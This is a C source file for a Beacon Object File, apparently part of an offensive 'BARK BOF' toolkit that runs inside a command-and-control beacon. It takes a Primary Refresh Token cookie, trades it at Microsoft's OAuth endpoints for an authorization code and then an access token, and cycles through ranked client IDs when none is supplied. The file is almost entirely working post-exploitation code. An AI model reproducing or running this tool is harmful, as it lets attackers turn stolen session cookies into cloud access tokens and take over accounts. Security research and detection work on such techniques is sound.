/*
 * get_token_with_prt_cookie.c — BARK BOF
 * Get-TokenWithPRTCookie — PRT Cookie flow: exchange a PRT Cookie for an access token
 *
 * Flow (3 steps):
 *   1. Decode the PRT Cookie JWT payload to extract request_nonce.
 *   2. GET /oauth2/authorize with the cookie as x-ms-RefreshTokenCredential;
 *      redirect-following is suppressed so the Location header (which contains
 *      the authorization code) can be captured.
 *   3. POST to /oauth2/token to exchange the authorization code for an access token.
 *
 * Args : prtToken, resource, tenantId, [clientId], [redirectUri]
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

/* ================================================================
 * go — BOF entry point
 * ================================================================ */
void go(char *args, int alen)
{
    datap  parser;
    char  *prtToken    = NULL;
    char  *resource    = NULL;
    char  *clientId    = NULL;
    char  *tenantId    = NULL;
    char  *redirectUri = NULL;

    /* ----------------------------------------------------------------
     * Parse arguments
     * ---------------------------------------------------------------- */
    BeaconDataParse(&parser, args, alen);
    prtToken    = BeaconDataExtract(&parser, NULL);
    resource    = BeaconDataExtract(&parser, NULL);
    tenantId    = BeaconDataExtract(&parser, NULL);
    clientId    = BeaconDataExtract(&parser, NULL);
    redirectUri = BeaconDataExtract(&parser, NULL);

    if (!prtToken || MSVCRT$strlen(prtToken) == 0 ||
        !resource || MSVCRT$strlen(resource) == 0 ||
        !tenantId || MSVCRT$strlen(tenantId) == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Usage: bark_get_token_with_prt_cookie"
            " <prtToken> <resource> <tenantId> [clientId] [redirectUri]\n");
        return;
    }
    if (!redirectUri || MSVCRT$strlen(redirectUri) == 0)
        redirectUri =
            "https://login.microsoftonline.com/common/oauth2/nativeclient";

    if (clientId && MSVCRT$strlen(clientId) > 0) {
        BarkPRTCookieFlow(prtToken, resource, clientId, tenantId, redirectUri);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Get-TokenWithPRTCookie -- no clientId specified, trying %d capability-ranked clients...\n",
            BARK_DEFAULT_CLIENT_ID_COUNT);
        int found = 0;
        int i;
        for (i = 0; i < BARK_DEFAULT_CLIENT_ID_COUNT; i++) {
            int clientIndex = BarkClientIndexForResource(resource, i);
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Trying %d/%d: %s (%s)...\n",
                i + 1, BARK_DEFAULT_CLIENT_ID_COUNT,
                BARK_DEFAULT_CLIENT_NAMES[clientIndex],
                BARK_DEFAULT_CLIENT_IDS[clientIndex]);
            if (BarkPRTCookieFlowTry(prtToken, resource,
                                      BARK_DEFAULT_CLIENT_IDS[clientIndex],
                                      tenantId, redirectUri, 1)) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] client_id: %s (%s)\n",
                    BARK_DEFAULT_CLIENT_IDS[clientIndex],
                    BARK_DEFAULT_CLIENT_NAMES[clientIndex]);
                found = 1;
                break;
            }
            BeaconPrintf(CALLBACK_OUTPUT, "    [-] Failed.\n");
        }
        if (!found)
            BeaconPrintf(CALLBACK_ERROR,
                "[-] All %d capability-ranked client IDs failed. Specify a clientId explicitly.\n",
                BARK_DEFAULT_CLIENT_ID_COUNT);
    }
}
